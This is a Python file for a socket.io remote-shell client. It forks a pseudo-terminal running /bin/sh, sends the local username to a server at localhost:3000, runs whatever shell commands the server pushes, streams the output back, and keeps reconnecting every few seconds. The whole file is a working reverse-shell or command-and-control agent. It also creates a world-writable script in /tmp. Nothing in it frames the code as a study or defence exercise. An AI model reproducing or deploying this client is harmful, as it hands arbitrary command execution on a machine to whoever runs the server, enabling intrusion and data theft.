from asyncio import subprocess
from asyncio.subprocess import STDOUT
from socket import socket
from time import sleep
import socketio
import subprocess
from subprocess import Popen, PIPE, STDOUT
import cmd
import os

SERVER_URL="http://localhost:3000"

# Setting up client web socket connection

sio = socketio.Client()

## Cleaning output file of child process

os.system("echo '' > /tmp/output")

## Create shell instance on fork

import pty
import signal

pid, fd = pty.fork()

if (pid == 0):
    os.system("touch /tmp/patate.sh && chmod 777 /tmp/patate.sh")
    buffer = open("/tmp/patate.sh", "w")
    # Redirect output in /tmp/output.
    buffer.write("#!/bin/bash\n/bin/sh &> /tmp/output")
    buffer.close()
    pty.spawn("/tmp/patate.sh")

var = None

def sHaND(yes, oui):
    global var
    var = "ok"

signal.signal(signal.SIGALRM, sHaND)

def sendCommandToFork(entry):
    global var
    size = os.stat("/tmp/output").st_size
    os.system("echo '' > /tmp/output")
    os.write(fd, bytes(entry + " && echo '' && kill -ALRM " + str(os.getpid()) + "\n", encoding="utf-8"))
    # Wait for end signal
    while (var == None): continue
    var = None
    buffer = open("/tmp/output", "r")
    buffer.seek(size)
    output = buffer.read()
    buffer.close()
    #output = os.popen("cat /tmp/output | cat")
    #val = output.read().replace("\0", "")
    #output.close()
    return output

## Services

def executeCommand(command):
    sio.emit("command_output", sendCommandToFork(command))

## Events

@sio.event
def connect():
    sio.emit("name", {"name" : os.popen("whoami").read()})
    print("I'm connected boi")

@sio.event
def connect_error(data):
    print("The connection failed!")

@sio.event
def message(data):
    print('I received a message!')
    if (data["type"] == "msg"):
        print(data["msg"])
    elif (data["type"] == "command"):
        executeCommand(data["command"])

@sio.event
def disconnect():
    print("Server isn't running anymore :(")

while (not(sio.connected)):
    try:
        sio.connect(SERVER_URL)
    except:
        print("Server not running")
    sleep(3)
